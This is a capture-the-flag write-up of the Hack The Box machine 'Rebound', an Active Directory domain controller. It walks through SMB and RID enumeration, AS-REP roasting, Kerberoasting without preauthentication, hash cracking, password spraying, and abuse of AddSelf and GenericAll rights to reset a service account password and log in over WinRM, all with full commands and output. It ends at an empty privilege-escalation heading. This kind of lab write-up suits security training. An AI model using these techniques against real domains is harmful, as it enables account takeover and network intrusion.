---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Rebound

## Summary

[Rebound](https://app.hackthebox.com/machines/560) is an <mark style="color:red;">insane-rated</mark> box

## Recon

### Information Gathering

Let's start with our [ritualistic nmap scan](../../../tools/tools/port-scanners/nmap.md#nmap-flow) (Figure 1).

```bash
nmap-scan.sh 10.10.11.231
Creating directory...
Performing initial scan...
Extracting ports...
Performing an aggresive scan on open ports...
All done! See results: less scans/aggressive_scan.nmap
```

<figure><img src="../../../.gitbook/assets/rebound_nmap (1).png" alt=""><figcaption><p>Figure 1: Services listening on the Rebound machine.</p></figcaption></figure>

Let's write some things down:

* Based on services like DNS (`53`), Kerberos (`88`) and LDAP (`3268`) we are dealing with a DC.
* The FQDN is `DC01.REBOUND.HTB`.
* SMB is available (`445`).
* WinRM is also available (`5985`). &#x20;

Our plan moving forwards would be to:

1. Add the hostname (`DC01`), domain (`REBOUND.HTB`), and FQDN (`DC01.REBOUND.HTB`) to our local DNS file (`/etc/hosts`).
2. See what information we can get out of the SMB server.
3. See what information we can get out of the LDAP server.

```bash
$ grep rebound /etc/hosts
10.10.11.231    dc01 rebound.htb dc01.rebound.htb
```

### Brute-Forcing RIDs

Quering the SMB server about its shares without passing any or using empty (`' '`) credentials does not work, but `guest` does the trick. There is just one non-default share (`Shared`) but its seems empty  (Figure 2).

{% code overflow="wrap" fullWidth="false" %}
```bash
# enumerating share access
nxc smb dc01 -u 'guest' -p '' --shares
# spidering the specified share
nxc smb dc01 -u 'guest' -p '' --spider Shared --regex .
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/rebound_nxc_shares.png" alt=""><figcaption><p>Figure 2: Enumerating and spidering SMB shares.</p></figcaption></figure>

Using the `--users` flag returns nothing, but we can always try brute-force RIDs (Figure 3).

<figure><img src="../../../.gitbook/assets/rebound_rid_bfa.png" alt=""><figcaption><p>Figure 3: Enumerating users using SMB.</p></figcaption></figure>

Only the last 3 lines of the above output are actual users, which is kind of odd. In addition, we can see that `fflock` has the RID of `3382` which is close to [NXC](../../../tools/tools/active-directory/netexec-cme.md)'s default max RID (`4000`). Let's increase that to see if more usernames pop up (Figure 4).

<pre class="language-bash"><code class="lang-bash"><strong>nxc smb dc01 -u 'guest' -p '' --rid-brute 10000
</strong></code></pre>

<figure><img src="../../../.gitbook/assets/rebound_rid_bfa_10k.png" alt=""><figcaption><p>Figure 4: Enumerating users while with RID up to 10000.</p></figcaption></figure>

We get back 10 more usernames, a total of 13! Let's create a username list.

```bash
# write NXC's output into a file
nxc smb dc01 -u 'guest' -p '' --rid-brute > nxc_users
# extract the usernames
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' | tail -n13
ppaul
llune
fflock
jjones
mmalone
nnoon
ldap_monitor
oorend
ServiceMgmt
winrm_svc
batch_runner
tbrady
delegator$
# extract and write the last 3 lines into a file
cat nxc_users | awk '{print $6}' | awk -F'\' '{print $2}' | tail -n13 > dom_users
```

## Foothold

### Kerberoasting

The first thing we always do when we obtain valid domain usernames is to check if any of them are vulnerable to [ASREPRoasting](../../../tl-dr/tl-dr/active-directory/attacks/asreproasting.md).

{% code overflow="wrap" %}
```bash
nxc ldap dc01 -u dom_users -p '' --asreproast asreproast.lst
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             $krb5asrep$23$jjones@REBOUND.HTB:5cd9a482dd659d184098afef05d268d4$82239f120ad02681021346c6a7b6d1f76ce6b0c0e1292206fd056a1136c52428b78d1e909944d8d633957bb76dd625afc4fcea0b48310b7b4861550c969c4392dfdfc6cbb36099b3e0fcf7e96f20011e2c36f1faf6b2b67877db5ad0a5922e984d3ea3e24cdfc33425028828007703f913a4232568cf4aff69d457443f418606f03fce800057b01bcac7f2ab8d54a9494206ac9937903b82ac9d85980db467d9d0fe373dcc6bc1ca2a72c85c4f2aa4e0e4f4b8bdfdef491c71e1f954be0288b02f12ed537234711537efa5dd1051a8aca7ec640f93f59e9fbf58179d1f0731e1ff3c1ebf859728b91776
```
{% endcode %}

It seems we get a hit! Sadly, [`hashcat`](../../../tools/tools/passwords/hashcat.md) is not able to crack it.

```bash
hashcat -m18200 asreproast.lst /usr/share/wordlists/rockyou
```

Typically, [Kerberoasting](../../../tl-dr/tl-dr/active-directory/attacks/kerberoasting.md) needs domain credentials, but according to [new research](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/), it is possible to perform this attack using an ASREPRoastable account. In our case, we have `jjones`, so let's try it out (Figure 5).

{% code overflow="wrap" %}
```bash
# cloning impacket
sudo git clone https://github.com/fortra/impacket
Cloning into 'impacket'...
remote: Enumerating objects: 23474, done.
remote: Counting objects: 100% (48/48), done.
remote: Compressing objects: 100% (38/38), done.
remote: Total 23474 (delta 19), reused 27 (delta 10), pack-reused 23426
Receiving objects: 100% (23474/23474), 9.97 MiB | 9.29 MiB/s, done.
Resolving deltas: 100% (17811/17811), done.
# kerberoasting
sudo python3 /opt/impacket/examples/GetUserSPNs.py -no-preauth jjones -usersfile dom_users -dc-host 10.10.11.231 rebound.htb/ -outputfile kerb.txt
# checking output
cat kerb.txt
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/rebound_kerberoast.png" alt=""><figcaption><p>Figure 5: Kerberoasting without domain credentials!</p></figcaption></figure>

Luckily for us, `hashcat` is able to crack `ldap_monitor`'s account password this time.

{% code overflow="wrap" %}
```bash
hashcat -m13100 kerb.txt /usr/share/wordlists/rockyou
<SNIP>
$krb5tgs$23$*ldap_monitor$REBOUND.HTB$ldap_monitor*$fde<SNIP>bee:1GR8t@$$4u
<SNIP>
```
{% endcode %}

### Password Spraying

Unfortunately, this account does not have WinRM access. We can continue by performing a password spray attack to check if `ldap_monitor`'s password is being reused (Figure 6).

<figure><img src="../../../.gitbook/assets/rebound_pass_spray.png" alt=""><figcaption><p>Figure 6: Performing a password spray attack.</p></figcaption></figure>

It seems that this password is used in 3 different accounts, but none has WinRM access. Not much we can do with any of them, so let's turn to [BloodHound](../../../tools/tools/active-directory/bloodhound.md).

### BloodHound

After some analysis, a path to the foothold is revealed (Figure 7).

{% code overflow="wrap" %}
```bash
nxc ldap dc01.rebound.htb -u ldap_monitor -p ldap_monitor_pass -k --bloodhound -ns 10.10.11.231 -c Group,LocalADmin,RDP,DCOM,Container,PSRemote,Session,Acl,Trusts,LoggedOn
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/rebound_bh.png" alt=""><figcaption><p>Figure 7: Analyzing domain data with BloodHound.</p></figcaption></figure>

Based on the above information, our plan is the following:

1. `oorend` has [`AddSelf`](../../../tl-dr/tl-dr/active-directory/rights/addself.md) rights over `ServiceMgmt` group so it can add itself to it.
2. The `ServiceMgmt` group has [`GenericAll`](../../../tl-dr/tl-dr/active-directory/rights/genericall.md) rights over the `Service Users` OU, which means that it has total control over its members, and therefore, can change the password of `WinRM_svc`.
3. `WinRM_svc` is a member of the `Remote Management Users` group, which means it can be used to log into the box via the WinRM protocol.

```bash
# connect to the DC
powerview rebound.htb/oorend:'1GR8t@$$4u'@rebound.htb -k
Logging directory is set to /home/x7331/.powerview/logs/rebound.htb
(LDAPS)-[rebound.htb]-[rebound\oorend]
# add user to the group
PV > Add-DomainGroupMember -Identity servicemgmt -Members oorend
[2024-04-14 07:41:14] User oorend successfully added to servicemgmt
# confirm group membership
PV > Get-DomainGroupMember -Identity servicemgmt
GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : ppaul
MemberDistinguishedName     : CN=ppaul,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-1951

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : fflock
MemberDistinguishedName     : CN=fflock,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-3382

GroupDomainName             : ServiceMgmt
GroupDistinguishedName      : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb
MemberDomain                : rebound.htb
MemberName                  : oorend
MemberDistinguishedName     : CN=oorend,CN=Users,DC=rebound,DC=htb
MemberSID                   : S-1-5-21-4078382237-1492182817-2568127209-7682
```

Next, let's give `oorend` `GenericAll` rights over the `Service Users` OU.

{% code overflow="wrap" %}
```bash
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb add genericAll 'OU=SERVICE USERS,DC=REBOUND,DC=HTB' oorend
[+] oorend has now GenericAll on OU=SERVICE USERS,DC=REBOUND,DC=HTB
# confirm FullControl of oorend over winrm_svc
PV > Get-DomainObjectAcl -Identity winrm_svc -Where "SecurityIdentifier contains oorend"
ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb
ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684
ACEType                     : ACCESS_ALLOWED_ACE
ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE
ActiveDirectoryRights       : FullControl
AccessMask                  : 0xf01ff
InheritanceType             : None
SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)
```
{% endcode %}

With `FullControl` rights, we can now change `winrm_svc`'s password.

{% code overflow="wrap" %}
```bash
# change winrm_svc's password
bloodyAD -d rebound.htb -u oorend -p '1GR8t@$$4u' --host dc01.rebound.htb set password winrm_svc 'Password123!'
[+] Password changed successfully!
# confirm WinRM access
$ nxc winrm 10.10.11.231 -u winrm_svc -p winrm_svc_pass
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [+] rebound.htb\winrm_svc:******** (Pwn3d!)
# log into the machine via WinRM
evil-winrm -i 10.10.11.231 -u winrm_svc -p $(cat winrm_svc_pass)

<SNIP>
*Evil-WinRM* PS C:\Users\winrm_svc\Documents> type ..\Desktop\user.txt
07e<REDACTED>6e3
```
{% endcode %}

## Elevation of Privileges



